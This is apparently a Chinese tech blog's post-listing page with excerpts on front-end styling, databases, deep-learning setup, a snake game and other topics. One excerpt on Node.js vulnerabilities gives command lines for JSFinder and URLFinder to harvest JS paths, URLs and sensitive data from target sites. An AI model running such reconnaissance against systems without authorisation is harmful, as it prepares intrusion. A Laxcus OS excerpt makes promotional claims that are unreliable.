&lt;div class="tree-wrap tree-line"&gt; &lt;el-tree ref="tree" :expand-on-click-node="false" default-expand-all :data="dataTree" :props="defaultProps" node-key="id" highlight-current @node-click="treeNodeClick" /&gt; &lt;/div&gt; let dataTree = [{ id:'1', label:'XXXXX作战子信息', children:[{ id:'2', label:'XX', },{ id:'3', label:'XX', },{ id:'4', label:'XXI', },{ id:'5', label:'XXII', },{ id:'6', label:'XX', },{ id:'7', label:'XX', },{ id:'8', label:'XX', },] }] :deep(.tree-line .el-tree-node__content) { padding-left: 2px !important; } // 虚线所需样式 :deep(.tree-line) { .el-tree &gt; .el-tree-node:after { border-top: none; } .el-tree-node__children { .el-tree-node { position: relative; padding-left: 16px; } } .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fde9a0626921ffcd0dfeab1bf24a08c0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/24bc45cc4bb91918beb82b5290c1cd7a/" rel="bookmark">
			doris安装文档翻译-标准部署(Standard deployment)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文档地址: 对应1.2版本
Standard deployment - Apache Doris
This topic is about the hardware and software environment needed to deploy Doris, the recommended deployment mode, cluster scaling, and common problems occur in creating and running clusters.
Before continue reading, you might want to compile Doris following the instructions in the Compile topic.
翻译:
本主题是关于部署Doris所需的硬件和软件环境、建议的部署模式、集群扩展以及创建和运行集群时出现的常见问题。
在继续阅读之前，您可能需要按照编译主题中的说明编译Doris。
Software and Hardware Requirements​ Overview​ Doris, as an open source OLAP database with an MPP architecture, can run on most mainstream commercial servers.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/24bc45cc4bb91918beb82b5290c1cd7a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/afcefb59343ce171f2112ff6b10c41eb/" rel="bookmark">
			Element-plus修改样式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		场景
通过样式穿透修改前端element组件样式。
实现
1.button按钮
::v-deep .el-button {
border-radius: 0;
border: 0;
background-color: rgba(0, 194, 255) !important;
color: black;
}
2.form表单
::v-deep .el-form {
text-align: left;
.el-form-item {
text-align: left;
.el-form-item__label {
color: skyblue;
text-align: left;
}
.el-form-item__content {
color: skyblue;
text-align: left;
}
}
}
input ::v-deep .el-input {
width: 300px;
border: none;
.el-input__wrapper {
background-color: transparent !important;
border: none;
// border-color: rgba(37, 65, 125, 1) !important;
.el-input__inner {
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/afcefb59343ce171f2112ff6b10c41eb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bd32094fc235414b85250e4c18dfb377/" rel="bookmark">
			76.临时表空间数据文件损坏修复
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		--11g单机,无法查询临时表空间。
--2021年,通过备库恢复的方式创建数据库的时候遗留的问题。
1.老核心系统临时表空间查看
SQL&gt; set line 300 SQL&gt; col tablespace_name for a30 SQL&gt; col status for a10 SQL&gt; col FILE_NAME for a110 SQL&gt; select FILE_NAME,tablespace_name,status,round(bytes/1024/1024/1024,2) CUR_GB,AUTOEXTENSIBLE AUTOEXT,round(MAXBYTES/1024/1024/1024,2) MAX_GB from dba_temp_files where tablespace_name in ('TEMP'); from dba_temp_files where tablespace_name in ('TEMP') * ERROR at line 2: ORA-01157: cannot identify/lock data file 1028 - see DBWR trace file ORA-01110: data file 1028: '+DATA' SQL&gt; select FILE_NAME from dba_temp_files; ERROR: ORA-01157: cannot identify/lock data file 1028 - see DBWR trace file ORA-01110: data file 1028: '+DATA' no rows selected 2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bd32094fc235414b85250e4c18dfb377/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/777b000ddef016a0f8f5ec6fe502896f/" rel="bookmark">
			2024年5月软考报名考试攻略
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、2024年5月软考报名入口及网址
2024上半年中级软考报名入口在中国计算机技术职业资格网，报名入口网址为http://www.ruankao.org.cn。考生通过浏览器打开中国计算机技术职业资格网，点击页面左下方的报名入口，即可进入全国计算机技术与软件专业技术资格（水平）考试网上报名平台（http://bm.ruankao.org.cn/sign/welcome）。
二、2024年5月软考报名条件
1.凡遵守中华人民共和国宪法和各项法律，恪守职业道德，具有一定计算机技术应用能力的人员，均可根据情况报名参加相应专业类别、级别的考试。
2.获准在中华人民共和国境内就业的外籍人员及港、澳、台地区专业技术人员，可报名参加考试。
3.报考人员不受学历、资历、年龄的限制。
三、2024年5月软考考试时间及方式
2024年5月软考考试时间：2024年5月25日-28日。
2024年5月软考考试方式：
考试采取科目连考、分批次考试的方式，连考的第一个科目作答结束交卷完成后自动进入第二个科目，第一个科目节余的时长可为第二个科目使用。
中级资格：基础知识和应用技术2个科目连考，基础知识科目最短作答时长90分钟，最长作答时长120分钟，2个科目作答总时长240分钟,考试结束前60分钟可交卷离场。
2024软考资料分享
四、2024年5月软考备考方法
1.刷题配合学习
备考阶段，只看书不做题，事倍功半，通过做题既可以检查巩固学习的章节重点以及框架，也能根据做题的效果来查缺补漏，之前看书时忽略和漏掉的重点内容。刷题的试题范围可以包括历年真题、模拟试题等。
2.固定学习时间
至少保证每天的学习时间要够2—5小时，如果确实没有太多时间，每天最起码也要保证1小时。
只有坚持了，才能更好的打下基础，面对考试才会更轻松。
3.每日归纳总结
主要记录看书的进度及总结每天的备考不足之处。每天所定的进度，应当尽力完成，以免拖累后面的安排，当你通过了考试，回过头来看看，一定会感慨万千。
4.不要忽视历年真题
很多考生临近考试时，才会给自己找很多练习题来做，意识到做题是很重要的。但是大家千万不要只去做习题，而忘记了真题的重要。
其实通过真题的演练，可以研究考题的出题思路及特点，提前感受考场氛围，提升应试能力。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3d7b78bad3a8b3da95b244771c33ff6c/" rel="bookmark">
			深度学习(4)--Keras安装
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
Keras安装:
1.1.安装CUDA/cuDDN工具包
1.1.1.安装前准备
1.1.2.安装CUDA
1.1.3.安装cuDDN
1.2.安装Anaconda
1.3.安装tensorflow框架
1.3.1.使用cmd安装
1.3.2.使用Anaconda Prompt安装
1.4.安装Keras框架
1.5.打开jupyter notebook，执行import调用
Keras安装: 1.1.安装CUDA/cuDDN工具包 1.1.1.安装前准备 (1).查看显卡支持的最高cuda版本
在命令行中输入nvidia-smi.exe
博主的电脑显卡支持的CUDA最高版本为12.2
(2).查看对应CUDA对应的VS版本,提前安装好VS(此处不做VS安装展示)
查询官方的安装文档(此处给出的示例为CUDA12.1):
cuda-installation-guide-microsoft-windows 12.1 documentation
支持的VS版本如下表所示:
选择对应的VS版本进行安装即可 如果已经安装了VS,可以通过如下方法查询版本是否符合要求
随便打开一个项目,在顶部找到帮助,
点击关于Mircrosoft Visual Studio
即可查询到当前安装的VS版本
(3).如需下载gpu版本的Keras,找到CUDA对应的cuDNN版本
在官方下载界面中查询对应版本: Log in | NVIDIA Developer
CUDA 12.x版本对应的cuDDN v8.9.7
1.1.2.安装CUDA 下载12.1.0版本的CUDA安装包
Version的选择取决于你的操作系统版本,博主的电脑是Windows10,则选择Version 10
Installer Type选择的是在线下载和离线下载,可按自己的需求选择
下载安装包后,开始安装
按照步骤依次安装即可,唯一有区别的点在于你是否提前安装了Visual Studio
如果提前安装了Visual Studio
如果没有提前安装Visual Studio,需要把CUDA里面的Visual Studio Integration取消
显示已经安装了的VS版本
安装完成
检查是否安装成功
在cmd中输入nvcc -V
出现了如上的CUDA版本信息,则安装成功 1.1.3.安装cuDDN 在下述链接中下载CUDA对应的cuDNN:
Log in | NVIDIA Developer
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3d7b78bad3a8b3da95b244771c33ff6c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/79b2d8cf0991ee6a629517323c5ab325/" rel="bookmark">
			《动手学深度学习(PyTorch版)》笔记4.4
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		注：书中对代码的讲解并不详细，本文对很多细节做了详细注释。另外，书上的源代码是在Jupyter Notebook上运行的，较为分散，本文将代码集中起来，并加以完善，全部用vscode在python 3.9.18下测试通过。
Chapter4 Multilayer Perceptron 4.4 Model Selection 作为机器学习科学家，我们的目标是发现模式（pattern）。但是，我们如何才能确定模型是真正发现了一种泛化的模式，而不是简单地记住了数据呢？例如，我们想要在患者的基因数据与痴呆状态之间寻找模式，其中标签是从集合 { 痴呆 , 轻度认知障碍 , 健康 } \{\text{痴呆}, \text{轻度认知障碍}, \text{健康}\} {痴呆,轻度认知障碍,健康}中提取的，因为基因可以唯一确定每个个体（不考虑双胞胎），所以在这个任务中是有可能记住整个数据集的。我们不想让模型只会做这样的事情：“那是鲍勃！我记得他！他有痴呆症！”。原因很简单：当我们将来部署该模型时，模型需要判断从未见过的患者。只有当模型真正发现了一种泛化模式时，才会作出有效的预测。
更正式地说，我们的目标是发现某些模式，这些模式捕捉到了我们训练集潜在总体的规律。如果成功做到了这点，即使是对以前从未遇到过的个体，模型也可以成功地评估风险。如何发现可以泛化的模式是机器学习的根本问题。
困难在于，当我们训练模型时，我们只能访问数据中的小部分样本。最大的公开图像数据集包含大约一百万张图像。而在大部分时候，我们只能从数千或数万个数据样本中学习。在大型医院系统中，我们可能会访问数十万份医疗记录。当我们使用有限的样本时，可能会遇到这样的问题：当收集到更多的数据时，会发现之前找到的明显关系并不成立。
将模型在训练数据上拟合的比在潜在分布中更接近的现象称为过拟合（overfitting），用于对抗过拟合的技术称为正则化（regularization）。在前面的章节中，有些读者可能在用Fashion-MNIST数据集做实验时已经观察到了这种过拟合现象。在实验中调整模型架构或超参数时会发现：如果有足够多的神经元、层数和训练迭代周期，模型最终可以在训练集上达到完美的精度，此时测试集的准确性却下降了。
4.4.1 Training Error and Generalization Error 训练误差（training error）指模型在训练数据集上计算得到的误差。泛化误差（generalization error）指模型应用在同样从原始样本的分布中抽取的无限多数据样本时，模型误差的期望。问题是，我们永远不能准确地计算出泛化误差。这是因为无限多的数据样本是一个虚构的对象。在实际中，我们只能通过将模型应用于一个独立的测试集来估计泛化误差，该测试集由随机选取的、未曾在训练集中出现的数据样本构成。
考虑一个简单地使用查表法来回答问题的模型。如果允许的输入集合是离散的并且相当小，那么也许在查看许多训练样本后，该方法将执行得很好。但当这个模型面对从未见过的例子时，它表现的可能比随机猜测好不到哪去。这是因为输入空间太大了，远远不可能记住每一个可能的输入所对应的答案。例如，考虑 28 × 28 28\times28 28×28的灰度图像。如果每个像素可以取 256 256 256个灰度值中的一个，则有 25 6 784 256^{784} 256784个可能的图像。这意味着指甲大小的低分辨率灰度图像的数量比宇宙中的原子要多得多。即使我们可能遇到这样的数据，我们也不可能存储整个查找表。
最后，考虑对掷硬币的结果（类别0：正面，类别1：反面）进行分类的问题。假设硬币是公平的，无论我们想出什么算法，泛化误差始终是 1 2 \frac{1}{2} 21​。然而，对于大多数算法，我们应该期望训练误差会更低（取决于运气）。考虑数据集{0，1，1，1，0，1}。我们的算法不需要额外的特征，将倾向于总是预测多数类，从我们有限的样本来看，它似乎是1占主流。在这种情况下，总是预测类1的模型将产生 1 3 \frac{1}{3} 31​的误差，这比我们的泛化误差要好得多。当我们逐渐增加数据量，正面比例明显偏离 1 2 \frac{1}{2} 21​的可能性将会降低，我们的训练误差将与泛化误差相匹配。
4.4.1.1 I.I.D. Assumption 在我们目前已探讨、并将在之后继续探讨的监督学习情景中，我们假设训练数据和测试数据都是从相同的分布中独立提取的。这通常被称为独立同分布假设（i.i.d. assumption），这意味着对数据进行采样的过程没有进行“记忆”。换句话说，抽取的第2个样本和第3个样本的相关性，并不比抽取的第2个样本和第200万个样本的相关性更强。
要成为一名优秀的机器学习科学家需要具备批判性思考能力。假设是存在漏洞的，即很容易找出假设失效的情况。如果我们根据从加州大学旧金山分校医学中心的患者数据训练死亡风险预测模型，并将其应用于马萨诸塞州综合医院的患者数据，结果会怎么样？这两个数据的分布可能不完全一样。此外，抽样过程可能与时间有关。比如当我们对微博的主题进行分类时，新闻周期会使得正在讨论的话题产生时间依赖性，从而违反独立性假设。
有时候我们即使轻微违背独立同分布假设，模型仍将继续运行得非常好。比如，我们有许多有用的工具已经应用于现实，如人脸识别、语音识别和语言翻译。毕竟，几乎所有现实的应用都至少涉及到一些违背独立同分布假设的情况。
有些违背独立同分布假设的行为肯定会带来麻烦。比如，我们试图只用来自大学生的人脸数据来训练一个人脸识别系统，然后想要用它来监测疗养院中的老人。这不太可能有效，因为大学生看起来往往与老年人有很大的不同。
在接下来的章节中，我们将讨论因违背独立同分布假设而引起的问题。目前，即使认为独立同分布假设是理所当然的，理解泛化性也是一个困难的问题。此外，能够解释深层神经网络泛化性能的理论基础，也仍在继续困扰着学习理论领域的学者们。当我们训练模型时，我们试图找到一个能够尽可能拟合训练数据的函数。但是如果它执行地“太好了”，而不能对看不见的数据做到很好泛化，就会导致过拟合。这种情况正是我们想要避免或控制的，深度学习中有许多启发式的技术旨在防止过拟合。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/79b2d8cf0991ee6a629517323c5ab325/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7f22d36eaa749755ecc5c4017a40f11f/" rel="bookmark">
			node.js漏洞总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		js开发的web应用和php/Java最大的区别就是js可以通过查看源代码的方式查看到编写的代码，但是php/Java的不能看到，也就是说js开发的web网页相当于可以进行白盒测试。
流行的js框架有：
1. AngularJS 2. React JS 3. Vue 4. jQuery 5. BackboneJS 6. NodeJS 7. Ember 8. Meteor 9. Polymer 10.Aurelia 那怎么判断一个网站是不是由js开发的呢：
1.wappalyzer:直接下载后解压用谷歌浏览器导入就可以用，可以判断一个网站是不是js框架，例如随便打开一个要测试的网站，然后右上角点击插件查看：
可以看到此网站用到的js框架，确定为js框架搭建，第一步就完成。
2.FindSomething-master插件:自动爬取当前网站存在的js路径以及敏感信息，例如:
自动找到js路径以及敏感信息，我们对其拼接就可以尝试发现js未授权等漏洞。
以上插件下载就导入使用，简单方便。
JSFinder:一款用作快速在网站的js文件中提取URL，子域名的工具。
下载地址:https://github.com/Threezh1/JSFinder
使用方法:python JSFinder.py -u 目标地址
URLFinder:更专注于提取页面中的JS与URL链接，提取的数据更完善且可查看状态码、内容大小、标题等
下载地址:https://github.com/pingc0y/URLFinder
使用方法:
URLFinder.exe -u http://www.baidu.com -s all -m 2
多个url:
URLFinder.exe -s all -m 2 -f url.txt -o d:/
bp中也有相关的插件，jsfinder
另外注意：Webpack 是一个开源的JavaScript模块打包器，它可以将许多模块按照依赖关系打包成一个或多个文件。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/33f3607905fda3e021d3a838e1f6ae69/" rel="bookmark">
			同为科技（TOWE）自动控制循环定时插座
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		随着科技的发展，智能化家居已成为我们生活的重要组成部分。作为国内领先的智能家居品牌，同为科技（TOWE）推出的自动控制循环定时插座，无疑将科技与生活完美地结合在一起。
1.外观设计 同为科技（TOWE）自动控制循环定时插座外观简洁大方，采用PC阻燃材料，表面处理得光滑亮丽。其大块液晶屏幕设计，使得时间显示更加直观，用户无需凑近便能一目了然。这种人性化的设计不仅给用户带来了舒适的视觉体验，还大大提升了产品的实用性。
2. 功能特点 （1）定时功能：这款插座拥有20组定时开关功能，用户可以根据自己的需求，按分钟、小时、天、周进行循环设定。例如，在晚上10点自动关闭空调，或在每天早晨7点自动开启热水器。这种精准的定时功能，不仅避免了长时间过充的问题，还大大延长了家用电器的使用寿命。
（2）倒计时功能：在某些特定场合，用户可能需要设置倒计时功能。例如，烘焙电器需要预热10分钟，用户可以通过设置倒计时功能，确保在烘焙开始前设备已经达到预热状态。
（3）记忆功能：同为科技（TOWE）自动控制循环定时插座内置优质IC芯片，拥有60天断电记忆功能。这意味着，即使在突然断电的情况下，插座也能记住之前的设定，无需用户重新设置。
（4）安全可靠：插座内部铜件采用高精镀磷青铜，一次性压铸成型，保证了在使用过程中不易变形、短路或断路。此外，夜晚定时自动断电的功能，让用户在使用过程中更加安心。
3.适用场景 同为科技（TOWE）自动控制循环定时插座适用于各种需要定时开关的场景。无论是家用电器如空调、热水器、取暖器等，还是烘焙电器、水族鱼缸、电池充电等场景，这款插座都能发挥出其强大的功能。
4.使用方法 （1）时间设定：用户只需长按“设置”键，屏幕上的时钟数值便会开始闪动。此时，通过按方向键调整时钟、分钟、秒钟即可完成时间设定。
（2）定时设定：首先按下“设置”键进入设定模式，然后根据需求设置时间。用户可以设置20组开关数据，以满足各种不同的定时需求。
（3）模式设定：按下“模式”键后，用户可以选择插座模式的开启、关闭与循环。例如，在冬天，用户可以设置每天早晨7点自动开启空调制热模式，晚上10点自动关闭空调。
5.总结
同为科技（TOWE）自动控制循环定时插座凭借其出色的外观设计、强大的功能特点、广泛的适用场景以及简单便捷的使用方法，成为市场上的明星产品。它的出现不仅为用户带来了极大的便利性，也让智能家居的生活方式得到了进一步的普及。这款插座完美地将科技与生活融合在一起，成为了智能家居生态中不可或缺的一环。
综上所述，同为科技（TOWE）自动控制循环定时插座凭借其出色的性能和广泛的应用场景，为用户带来了前所未有的智能家居体验。在未来，我们期待同为科技（TOWE）能够继续推出更多创新产品，引领智能家居行业的发展潮流。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/46bda789351f2c5920b31460e7850dac/" rel="bookmark">
			Vue自定义指令校验按钮权限
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目标 在类似运营平台的项目中，经常会有一些操作按钮需要校验当前登录的用户是否有权限访问。然而在每一个按钮上都加 v-if 判断非常的繁琐和冗余，为此可以通过自定义指令的方式来处理按钮权限
实现方案 在main.js全局添加自定义指令 // 权限列表，此处为mock，正式应根据登录人的身份从后端获取 const permissionList = ['productAdd', 'productDelete', 'productEdit']; const app = createApp(App); // 自定义权限校验指令 app.directive('permission', { mounted: function (el, binding) { // 获取绑定的权限值 const permission = binding.value; // 进行权限判断，如果权限列表中不包含传入的权限值，进行拦截 if (!permissionList.includes(permission)) { // 方法一：移除页面没有权限的按钮 el.parentNode &amp;&amp; el.parentNode.removeChild(el); // 方法二：显示操作按钮，点击弹出拦截提示 const cloneEl = el.cloneNode(true); // 克隆一个新节点，替换原有的点击事件，将点击事件改为无权限提示 cloneEl.addEventListener("click", function () { alert("没有该操作权限，请联系系统管理员！"); }); el.parentNode &amp;&amp; el.parentNode.replaceChild(cloneEl, el); // 替换掉原来绑定事件的节点 } } }); 如果是vue2，将mounted改为inserted即可
// Vue2 Vue.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/46bda789351f2c5920b31460e7850dac/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/784c8de0a13b40311448196db51c95a1/" rel="bookmark">
			Windows无法访问github解决方案
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		方案一 步骤1： 进入 C:\Windows\System32\drivers\etc 路径下
步骤2： 复制 hosts文件到桌面
步骤3： 在复制好的文件最后加上
140.82.114.4 github.com 199.232.69.194 github.global.ssl.fastly.net 步骤4： 将修改好的文件替换到 C:\Windows\System32\drivers\etc 路径下
步骤5： win+R 输入cmd 回车进入
步骤6： 执行 ipconfig/flushdns
重启浏览器就可以了
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/833367a1b7c0cf1e7076560417e6ca55/" rel="bookmark">
			nav02 学习03 机器人传感器
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		机器人传感器 移动机器人配备了大量传感器，使它们能够看到和感知周围的环境。这些传感器获取的信息可用于构建和维护环境地图、在地图上定位机器人以及查看环境中的障碍物。这些任务对于能够安全有效地在动态环境中导航机器人至关重要。
机器人的传感器类似人的感官，眼睛 和 嗅觉 等等
常用传感器的示例包括激光雷达、雷达、RGB 摄像头、深度摄像头、IMU 和 GPS。为了标准化这些传感器的消息格式并允许供应商之间更轻松地进行互操作，ROS 提供了sensor_msgs定义通用传感器接口的包。这也允许用户使用任何传感器供应商，只要它遵循sensor_msgs. 在下一小节中，我们将介绍一些导航中常用的消息，即sensor_msgs/LaserScan、sensor_msgs/PointCloud2、sensor_msgs/Range和sensor_msgs/Image。
除了软件包之外sensor_msgs，您还应该了解radar_msgs一些标准接口。vision_msgs它radar_msgs 定义了雷达专用传感器的消息，而该vision_msgs包定义了计算机视觉中使用的消息，例如对象检测、分割和其他机器学习模型。此包支持的消息有vision_msgs/Classification2D、vision_msgs/Classification3D、vision_msgs/Detection2D和vision_msgs/Detection3D，仅举几例。
您的物理机器人的传感器可能具有为其编写的 ROS 驱动程序（例如，连接到传感器、将数据填充到消息中并发布它们以供您的机器人使用的 ROS 节点），这些驱动程序遵循包中的标准接口sensor_msgs。该sensor_msgs套件使您可以轻松使用来自不同制造商的多种不同传感器。然后，像 Nav2 这样的通用软件包就可以读取这些标准化消息并独立于传感器硬件执行任务。在诸如 之类的模拟机器人上sam_bot，Gazebo 具有传感器插件，它们也会在包之后发布其信息sensor_msgs。
常见传感器消息 sensor_msgs在本小节中，我们将讨论您在设置 Nav2 时可能遇到的一些常见类型。我们将为每个传感器提供简要描述、Gazebo 中模拟的图像以及 RViz 中传感器读数的相应可视化。
sensor_msgs 除了下面列出的类型之外，还有其他类型。完整的消息列表及其定义可以在sensor_msgs 文档中找到。
传感器消息/激光扫描 此消息代表平面激光测距仪的单次扫描。该消息用于slam_toolbox定位nav2_amcl和绘图，或用于
nav2_costmap_2d 感知。
sensor_msgs/PointCloud2 该消息包含 3D 点的集合，以及有关每个点的可选附加信息。这可以来自 3D 激光雷达、2D 激光雷达、深度相机或更多。
传感器消息/范围 这是来自活动测距仪的单个距离读数，该测距仪发射能量并报告沿测量距离的弧线有效的一个距离读数。声纳、红外传感器或一维测距仪是使用此消息的传感器的示例。
传感器消息/图像 参考地址：
https://navigation.ros.org/setup_guides/sensors/setup_sensors.html#sensor-introduction
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9e84f97a94e124e6214570883529c010/" rel="bookmark">
			用C语言实现贪吃蛇游戏！！！（破万字）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 大家好呀，我是Humble，不知不觉在CSND分享自己学过的C语言知识已经有三个多月了，从开始的C语言常见语法概念说到C语言的数据结构今天用C语言实现贪吃蛇已经有30余篇博客的内容，也希望这些内容可以帮助到各位正在阅读的小伙伴~
本次贪吃蛇项目是Humble继扫雷，通讯录之后分享的第三个项目，大约有五六百行代码的量~
而且不出意外，这应该是HumbleC语言部分的最后一篇博客了，在这之后，Humble未来的规划是分享C++的相关语法内容，C++实现的数据结构与算法，计算机网络，操作系统以及数据库的相关知识，希望未来也请各位多多关照~
好了，因为是一篇具有特殊意义的博客，好像前言说的有些多了（笑），接下来废话不多说，直接进入我们今天的贪吃蛇项目的内容把~
游戏演示 关于贪吃蛇这个游戏，我相信各位并不陌生，小伙伴们也跟我一样在童年的时候都玩过吧~
那么在正式制作之前，先给大家看一下这个即将由我们自己制作的贪吃蛇游戏的演示 ，让各位先对它有个整体的了解之后，之后的制作才会更加容易~
当我们运行起来后，首先看到的是两个初始化界面
然后下面是正式开始游戏的画面
围起来的部分是地图，蛇的初始长度被设置为5个节点，通过按键操作吃掉食物会获得相应得分，同时蛇的节点会增加，其余规则可看界面右方给的文字说明
当我们撞到墙或者自身或者按ESC键自己退出时，会显示游戏结束的界面：
以上就是对这个贪吃蛇小游戏简单的一次总揽，更多细节上的东西我们放在下面再讲
目标 本篇博客的目标：
使用C语言在Windows环境的控制台中模拟实现经典小游戏贪吃蛇
实现基本的功能：
1.初始化以及地图的创建
2.蛇与食物的初始化
3.蛇吃食物
4.撞墙检测
5.装自身检测
6.蛇的移动，加速，减速
7.暂停功能
8.计算得分
....
技术要点 本次贪吃蛇项目涉及的技术要点主要有一下七点：
C语言函数、枚举、结构体、动态内存管理、链表、Win32 API等
前面5点都是Humble在之前的博客都有分享过的，各位小伙伴可以访问我的主页去阅读哦
今天在讲贪吃蛇这个项目之前，我先对Win32 API 做个介绍 ，对其进行了解才能更丝滑的写接下来的贪吃蛇项目哦~
Win32 API 一.Win32 API概述 Windows这个多作业系统除了协调程序的执行、分配内存、管理资源之外，它同时也是一个很大的服务中心，调用这个服务中心的各种服务（每一种服务就是一个函数），可以帮应用程序达到开启视窗、描绘图形、使用周边设备等目的，由于这些函数服务的对象是应用程序(Application)，所以便称之为Application Programming Interface，简称API函数
WIN32API也就是Microsoft Windows32位平台的应用程序编程接口
当然，这里大家不要太在乎这个32位平台，我们就把它统称为WIN32 API
二.控制台程序（Console） 控制台程序其实就是平常我们程序运行起来出现的界面
我们可以设置控制台窗口的长宽：设置控制台窗口的大小，30行，100列
mode con cols=100 lines=30
也可以通过命令设置控制台窗口的名字：
title 贪吃蛇
这些命令，我们可以调用C语言函数system来执行。
代码如下：
#include &lt;windows.h&gt; int main() { system("mode con cols=100 lines=30"); system("title 贪吃蛇"
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9e84f97a94e124e6214570883529c010/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6634def917e7802560d67f9d71ed8cba/" rel="bookmark">
			颠覆式创新：LAXCUS分布式操作系统7.0
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在这轮AI浪潮中，英伟达已经获得了硬件算力入口，Laxcus要获取软件算力入口。
有几位网友想了解我们正在研发的Laxcus分布式操作系统7.0的情况。应他们要求，今天就说说Laxcus 7.0版本。Laxcus 7.0是一个全新的操作系统，具有很多独特的优势，颠覆了很多人对传统操作系统的认知。下面列举一些它的特征，各位如果能够理解，就知道为什么说Laxcus 7.0是一个划时代的颠覆性新产品了。
1. 裸机系统
Laxcus 7.0是一个裸机操作系统。所谓裸机系统，就是直接运行在硬件设备上的操作系统。Laxcus 7.0和之前的Laxcus 6.0以及更早版本有很大不同，Laxcus 6.0从体系架构上来说属于寄居系统，它需要在其它操作系统上运行，而Laxcus 7.0直接运行在硬件上。之所以采用的技术路径，主要考虑是验证与分布式和软硬件资源整合的相关系统，现在这些技术已经验证完毕，所以裸机操作系统的Laxcus 7.0版本研发也就提上日程。这是操作系统研发中，一种比较稳妥的技术路线。目前除了Laxcus，采用这种路线还有Windows。当年微软发展Windows的时候，Windows 1.0 , 2.0, 3.0三个版本都是运行在DOS，直到Windows 95，才脱离寄居架构，直接运行在硬件设备上。
2. 与K8s的关系 可能是“分布式操作系统”这个词，一直以来，总有大批的业内人士望文生义，想当然把Laxcus和K8s划上等号，认为Laxcus是K8s的套壳和魔改。所以这里有需要再强调一遍，Laxcus和K8s没有任何关系。Laxcus 7.0是真正的操作系统，操作系统运行基础是硬件，而K8s是应用软件，应用软件的运行基础是操作系统。如果一定要说有什么关系，那么K8s可以在Laxcus 7.0版本上运行，这也许就是它们之间仅有的一点关系了。
3. 多机操作系统
Laxcus分布式操作系统本质是多机操作系统。多机操作系统的基本特点是能够同时管理N台计算机，并把这些计算机聚合起来形成一个整体，统一调度操作使用，所以Laxcus和计算机是一对多的关系。与之对应的是单机操作系统，单机操作系统只管理一台计算机，在一台计算机上运行，它们是一对一的关系。目前全球的操作系统市场，除了Laxcus，其它所有操作系统，包括Windows、Linux、Macintosh、iOS、Android，本质都属于单机操作系统。因为这个原因，所以我们能够说，Laxcus是对操作系统的一次重大技术创新，是一个划时代的产品。现在Laxcus分布式操作系统处于一种“前不见古人，后不见来者，拔剑四顾心茫然”的状态。未来，我们希望与各界合作，出现更多具备分布式能力的操作系统，一起打造分布式应用产业生态。
4. 双模态操作系统
Laxcus 7.0也是第一个双模态操作系统。所谓双模态，即Laxcus具备两种身份：多机操作系统和单机操作系统。多机操作系统上面介绍过了，计算机组网之后，Laxcus能够管理组网的计算机集群。如果把某台计算机从计算机集群中解耦，这时运行在这台计算机上的Laxcus，就从分布式的多机状态变成单机状态，成为一个单机操作系统，多机协同能力和分布属性将消失。Laxcus 7.0可以在多机操作系统和单机操作系统状态中任意切换和运行。
5. 性能
